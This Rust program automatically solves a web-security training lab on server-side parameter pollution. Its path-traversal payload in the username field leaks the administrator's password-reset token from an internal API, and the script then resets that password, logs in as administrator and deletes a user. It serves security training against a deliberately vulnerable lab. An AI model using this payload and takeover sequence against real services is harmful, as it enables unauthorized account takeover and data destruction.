/*****************************************************************
*
* Lab: Exploiting server-side parameter pollution in a REST URL
*
* Hack Steps:
*      1. Fetch the forgot password page
*      2. Extract the csrf token and session cookie
*      3. Make a forgot-password request for administrator
*      4. Get the reset token
*      5. Reset password for administrator
*      6. Login as administrator
*      7. Delete carlos from the admin panel
*
******************************************************************/
use lazy_static::lazy_static;
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use select::{document::Document, predicate::Attr};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0af4006f0360841384e0314100350051.web-security-academy.net";
const NEW_ADMIN_PASSWORD: &str = "Hacked"; // You can change this to what you want

lazy_static! {
    static ref WEB_CLIENT: Client = build_web_client();
}

fn main() {
    print!("â¦—1â¦˜ Fetching the forgot password page.. ");
    flush_terminal();

    let login_page = fetch("/forgot-password");

    println!("{}", "OK".green());
    print!("{}", "â¦—2â¦˜ Extracting the csrf token and session cookie.. ",);
    flush_terminal();

    let session = get_session_cookie(&login_page);
    let csrf_token = get_csrf_token(login_page);

    println!("{}", "OK".green());
    print!("â¦—3â¦˜ Making a forgot-password request for administrator.. ",);
    flush_terminal();

    forgot_password_for_administrator(&session, &csrf_token);

    println!("{}", "OK".green());
    print!("â¦—4â¦˜ Getting the reset token.. ");
    flush_terminal();

    let fetching_result = get_reset_token(&session, &csrf_token);
    let body = fetching_result.text().unwrap();
    let reset_token = capture_pattern_from_text(r###""result": "(\w*)""###, &body);

    println!("{} => {}", "OK".green(), reset_token.yellow());
    print!("â¦—5â¦˜ Resetting password for administrator.. ");
    flush_terminal();

    reset_administrator_password(&session, &csrf_token, &reset_token);

    println!("{}", "OK".green());
    print!("â¦—6â¦˜ Logging in as administrator.. ",);
    flush_terminal();

    let admin_login = login_as_administrator(&session, &csrf_token);

    println!("{}", "OK".green());
    print!("â¦—7â¦˜ Deleting carlos from the admin panel.. ",);
    flush_terminal();

    let admin_session = get_session_cookie(&admin_login);
    delete_carlos(&admin_session);

    println!("{}", "OK".green());
    println!("ðŸ—¹ The lab should be marked now as {}", "solved".green())
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn fetch(path: &str) -> Response {
    WEB_CLIENT
        .get(format!("{LAB_URL}{path}"))
        .send()
        .expect(&format!("â¦—!â¦˜ Failed to fetch: {}", path.red()))
}

fn forgot_password_for_administrator(session: &str, csrf_token: &str) {
    WEB_CLIENT
        .post(format!("{LAB_URL}/forgot-password"))
        .header("Cookie", format!("session={session}"))
        .form(&HashMap::from([
            ("username", "administrator"),
            ("csrf", csrf_token),
        ]))
        .send()
        .expect(&format!("{}", "â¦—!â¦˜ Failed to login as wiener".red()));
}

fn get_reset_token(session: &str, csrf_token: &str) -> Response {
    let payload = "../../../../api/internal/v1/users/administrator/field/passwordResetToken#";
    WEB_CLIENT
        .post(format!("{LAB_URL}/forgot-password"))
        .header("Cookie", format!("session={session}"))
        .form(&HashMap::from([
            ("username", payload),
            ("csrf", csrf_token),
        ]))
        .send()
        .expect(&format!("{}", "â¦—!â¦˜ Failed to login as wiener".red()))
}

fn get_csrf_token(response: Response) -> String {
    let document = Document::from(response.text().unwrap().as_str());
    document
        .find(Attr("name", "csrf"))
        .find_map(|f| f.attr("value"))
        .expect(&format!("{}", "â¦—!â¦˜ Failed to get the csrf".red()))
        .to_string()
}

fn get_session_cookie(response: &Response) -> String {
    let headers = response.headers();
    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
    capture_pattern_from_text("session=(.*); Secure", cookie_header)
}

fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
    let regex = Regex::new(pattern).unwrap();
    let captures = regex.captures(text).expect(&format!(
        "â¦—!â¦˜ Failed to capture the pattern: {}",
        pattern.red()
    ));
    captures.get(1).unwrap().as_str().to_string()
}

fn reset_administrator_password(session: &str, csrf_token: &str, reset_token: &str) {
    WEB_CLIENT
        .post(format!("{LAB_URL}/forgot-password"))
        .header("Cookie", format!("session={session}"))
        .form(&HashMap::from([
            ("passwordResetToken", reset_token),
            ("csrf", csrf_token),
            ("new-password-1", NEW_ADMIN_PASSWORD),
            ("new-password-2", NEW_ADMIN_PASSWORD),
        ]))
        .send()
        .expect(&format!("{}", "â¦—!â¦˜ Failed to login as wiener".red()));
}

fn login_as_administrator(session: &str, csrf_token: &str) -> Response {
    WEB_CLIENT
        .post(format!("{LAB_URL}/login"))
        .header("Cookie", format!("session={session}"))
        .form(&HashMap::from([
            ("username", "administrator"),
            ("password", NEW_ADMIN_PASSWORD),
            ("csrf", &csrf_token),
        ]))
        .send()
        .expect(&format!("{}", "â¦—!â¦˜ Failed to login as wiener".red()))
}

fn delete_carlos(session: &str) -> Response {
    WEB_CLIENT
        .get(format!("{LAB_URL}/admin/delete?username=carlos"))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!("â¦—!â¦˜ Failed to delete carlos"))
}

#[inline(always)]
fn flush_terminal() {
    io::stdout().flush().unwrap();
}
